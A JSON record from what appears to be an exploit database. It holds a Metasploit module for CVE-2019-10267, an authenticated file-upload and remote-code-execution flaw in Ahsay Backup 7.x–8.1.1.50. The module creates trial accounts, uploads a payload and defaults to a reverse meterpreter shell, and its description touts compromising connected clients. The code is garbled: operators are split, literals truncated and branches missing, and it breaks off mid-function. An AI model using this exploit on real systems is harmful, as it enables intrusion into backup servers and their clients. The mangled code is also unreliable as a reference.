{
    "text": "vul_name : Ahsay Backup 7.x / 8.x File Upload / Remote Code Execution ， vul_cve : CVE-2019-10267 ， vul_poc :  # Exploit Title : Authenticated insecure file upload and code execution flaw in Ahsay Backup v7.x - v8.1.1.50. ( Metasploit )  ，  # Date : 26-6-2019 ，  # Exploit Author : Wietse Boonstra ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 7.x < 8.1.1.50 ( REQUIRED )  ，  # Tested on : Windows / Linux ，  # CVE : CVE-2019-10267 ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， include REXML ， super ( update_info ( info ,  ， 'Name' => 'Ahsay Backup v7.x-v8.1.1.50 ( authenticated ) file upload' ,  ， 'Description' => %q{ ， This module exploits an authenticated insecure file upload and code ， execution flaw in Ahsay Backup v7.x - v8.1.1.50. To succesfully execute ， the upload credentials are needed , default on Ahsay Backup trial ， accounts are enabled so an account can be created. ， It can be exploited in Windows and Linux environments to get remote code ， execution ( usualy as SYSTEM ) . This module has been tested successfully ， on Ahsay Backup v8.1.1.50 with Windows 2003 SP2 Server. Because of this ， flaw all connected clients can be configured to execute a command before ， the backup starts. Allowing an attacker to takeover even more systems ， and make it rain shells !  ， Setting the CREATEACCOUNT to true will create a new account , this is ， enabled by default. ， If credeantials are known enter these and run the exploit. ， } ,  ， 'Author' => ，  [  ， 'Wietse Boonstra' ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2019-10267' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'Platform' => 'win' ,  ， 'DefaultOptions' => { ， 'RPORT' => 443 ,  ， 'SSL' => true ,  ， 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' ， } ,  ， 'Targets' => ，  [  ，  [ 'Windows x86' ,  ， { ， 'Arch' => ARCH_X86 ,  ， 'Platform' => 'win' ， } ，  ]  ,  ，  [ 'Linux x86' ,  # should work but untested ， { ， 'Arch' => ARCH_X86 ,  ， 'Platform' => 'linux' ， } ,  ，  ]  ,  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Jun 1 2019' )  ， register_options (  ，  [  ， Opt : RPORT ( 443 )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'Path to Ahsay' , '/' ]  )  ,  ， OptString.new ( 'USERNAME' ,  [ true , 'Username for the ( new ) account' , Rex : Text.rand_text_alphanumeric ( 8 )  ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password for the ( new ) account' , Rex : Text.rand_text_alpha ( 8 ) + Rex : Text.rand_text_numeric ( 5 ) + Rex : Text.rand_char ( \" , \" !  $ %^& * \" )  ]  )  ,  ， OptString.new ( 'CREATEACCOUNT' ,  [ false , 'Create Trial account' , 'false' ]  )  ,  ， OptString.new ( 'UPLOADPATH' ,  [ false , 'Payload Path' , '././webapps/cbs/help/en' ]  )  ,  ，  ]  )  ， end ， def is_trial_enabled? ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'obs' , 'obm7' , 'user' , 'isTrialEnabled' )  ,  ， 'method' => 'POST' ,  ， 'data' => ' ， } )  ， end ， end ， def check_account? ， headers = create_request_headers ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'obs' , 'obm7' , 'user' , 'getUserProfile' )  ,  ， 'method' => 'POST' ,  ， 'data' => ' ,  ， 'headers' => headers ， } )  ， print_good ( \"Username and password are valid ! \" )  ， elsif res and res.code = 500 and \"USER_NOT_EXIST\" = ~ / # {res.body}/ ，  # fail_with ( Failure : NoAccess , 'Username incorrect ! ' )  ， print_status ( \"Username does not exist.\" )  ， elsif res and res.code = 500 and \"PASSWORD_INCORRECT\" = ~ / # {res.body}/ ，  # fail_with ( Failure : NoAccess , 'Username exists but password incorrect ! ' )  ， print_status ( \"Username exists but password incorrect ! \" )  ， end ， end ， def create_request_headers ， headers = {} ， username = Rex : Text.encode_base64 ( datastore [ 'USERNAME' ]  )  ， password = Rex : Text.encode_base64 ( datastore [ 'PASSWORD' ]  )  ， headers [ 'X-RSW-custom-encode-username' ] = username ， headers [ 'X-RSW-custom-encode-password' ] = password ， headers ， end ， def exploit ， username = datastore [ 'USERNAME' ]  ， password = datastore [ 'PASSWORD' ]  ， fail_with ( Failure : NoAccess , 'Please set a username and password' )  ，  # check if account does not exists? ，  # Create account and check if it is valid ， drop_and_execute (  )  ， fail_with ( Failure : NoAccess , 'Failed to authenticate' )  ， end ，  # Need to fix , check if account exist ， print_good ( \"No need to create account , already exists ! \" )  ， drop_and_execute (  )  ， end ， end ， elsif username ! = \" and password ! = \" ， drop_and_execute (  )  ， fail_with ( Failure : NoAccess , 'Username and password are invalid. But server supports trial accounts , you can create an account ! ' )  ， end ， fail_with ( Failure : NoAccess , 'Username and password are invalid' )  ， end ， fail_with ( Failure : UnexpectedReply , 'Missing some settings' )  ， end ， end ， def create_account? ， headers = create_request_headers ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( target_uri.path , 'obs' , 'obm7' , 'user' , 'addTrialUser' )  ,  ， 'method' => 'POST' ,  ， 'data' => ' ,  ， 'headers' => headers ， } ) ",
    "time": "2019.07.27"
}